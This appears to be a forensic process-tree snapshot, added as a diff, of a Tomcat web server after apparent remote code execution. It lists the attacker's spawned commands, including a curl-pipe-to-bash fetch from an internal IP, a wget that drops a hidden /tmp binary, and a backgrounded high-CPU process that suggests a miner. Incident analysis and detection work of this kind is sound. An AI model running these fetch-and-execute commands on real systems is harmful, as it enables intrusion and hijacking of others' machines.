@@ -1,0 +1,26 @@
+Process tree snapshot — 2026-05-18 09:10:00 UTC
+
+java (pid: 2147, user: tomcat)
+├── sh -c whoami
+│   └── (completed, exit 0)
+├── sh -c hostname
+│   └── (completed, exit 0)
+├── sh -c curl -fsSL http://172.16.5.14/update.sh | bash
+│   ├── curl -fsSL http://172.16.5.14/update.sh
+│   │   └── (completed, exit 0)
+│   └── bash
+│       └── (completed, exit 0)
+├── sh -c wget http://172.16.5.14/bin/sysd -O /tmp/.sysd
+│   └── wget http://172.16.5.14/bin/sysd -O /tmp/.sysd
+│       └── (completed, exit 0)
+├── sh -c chmod +x /tmp/.sysd
+│   └── chmod +x /tmp/.sysd
+│       └── (completed, exit 0)
+├── sh -c nohup /tmp/.sysd --config=/tmp/.config.json >/dev/null 2>&1 &
+│   └── /tmp/.sysd --config=/tmp/.config.json
+│       └── (running, pid: 2215, cpu: 92.3%)
+└── sh -c crontab -l
+    └── (completed, exit 0)
+
+Note: All shell commands originated from the tomcat JVM process (pid 2147),
+indicating web application context code execution.
